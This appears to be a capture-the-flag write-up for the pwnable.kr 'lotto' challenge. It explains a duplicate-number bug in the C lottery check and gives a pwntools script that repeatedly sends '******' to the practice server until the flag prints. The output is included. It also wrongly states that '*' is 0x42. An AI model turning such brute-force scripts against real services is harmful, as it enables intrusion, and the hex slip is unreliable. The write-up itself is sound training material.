# LOTTO
again an easy one.
The problem is here:
```C
int match = 0, j = 0;
for(i=0; i<6; i++){
	for(j=0; j<6; j++){
		if(lotto[i] == submit[j]){
			match++;
		}
}
```
This loop is testing any number in `lotto` against any number in `submit`.
The right way to loop is:
```C
int match = 0, i=0;
for(i=0; i<6; i++){
	if (lotto[i] == submit[i]){
		match++;
	}
}
```
So if:
- the input contains only char _`X`_
- _`ord(X)`_ is in range of 1 - 45

It will take a second but it will work :)

## Exploit script
A simple script that connects to the remote server, running the process, and spamming `*` -> (which is `0x42`)
```python
import pwn

remote_ssh = pwn.ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = remote_ssh.process('./lotto')

for i in range(1000):
	p.recv()
	p.sendline(b'1')
	p.recv()
	p.sendline(b'******')
	_ , ans = p.recvlines(2)
	if b"bad" not in ans:
		print(ans.decode())
		break
```
Output:
```
[+] Connecting to pwnable.kr on port 2222: Done
[*] lotto@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on pwnable.kr: pid 269157
[!] ASLR is disabled for '/home/lotto/lotto'!
sorry mom... I FORGOT to check duplicate numbers... :(
```